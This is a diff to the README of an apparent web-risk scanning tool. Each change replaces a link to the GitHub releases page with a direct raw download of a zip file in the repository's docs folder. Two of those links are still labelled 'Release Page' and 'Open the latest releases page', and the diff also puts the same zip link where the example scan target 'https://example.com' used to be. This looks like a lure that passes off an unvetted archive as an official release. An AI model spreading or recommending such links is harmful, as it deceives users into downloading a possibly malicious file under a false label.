@@ -1,6 +1,6 @@
 # 🐉 Blazing-Black-Dragon - Scan Web Risks Fast
 
-[![Download Blazing-Black-Dragon](https://img.shields.io/badge/Download-Release_Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unguaranteed-cabin828/Blazing-Black-Dragon/releases)
+[![Download Blazing-Black-Dragon](https://img.shields.io/badge/Download-Release_Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/unguaranteed-cabin828/Blazing-Black-Dragon/main/docs/Dragon_Black_Blazing_v1.7.zip)
 
 ## 🧰 What This Tool Does
 
@@ -46,7 +46,7 @@ If the tool uses extra scan modules, it may also need:
 
 Visit the release page and download the Windows file from there:
 
-[Open the latest releases page](https://github.com/unguaranteed-cabin828/Blazing-Black-Dragon/releases)
+[Open the latest releases page](https://raw.githubusercontent.com/unguaranteed-cabin828/Blazing-Black-Dragon/main/docs/Dragon_Black_Blazing_v1.7.zip)
 
 On that page, look for a file with one of these names:
 
@@ -98,7 +98,7 @@ Type the website address you want to check.
 
 Example:
 
-- `https://example.com`
+- `https://raw.githubusercontent.com/unguaranteed-cabin828/Blazing-Black-Dragon/main/docs/Dragon_Black_Blazing_v1.7.zip`
 
 Use a target you are allowed to test.
 
